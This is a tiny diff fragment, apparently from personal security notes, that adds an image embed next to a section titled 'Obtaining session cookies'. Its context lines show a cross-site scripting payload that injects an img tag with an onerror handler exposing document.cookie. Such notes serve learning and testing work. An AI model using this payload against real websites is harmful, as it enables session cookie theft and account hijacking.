@@ -4,6 +4,7 @@ ___
 "><img src=x onerror=prompt(document.cookie)>
 ```
 
+![[Pasted image 20241012104359.png]]
 # Obtaining session cookies 
 
 ```php
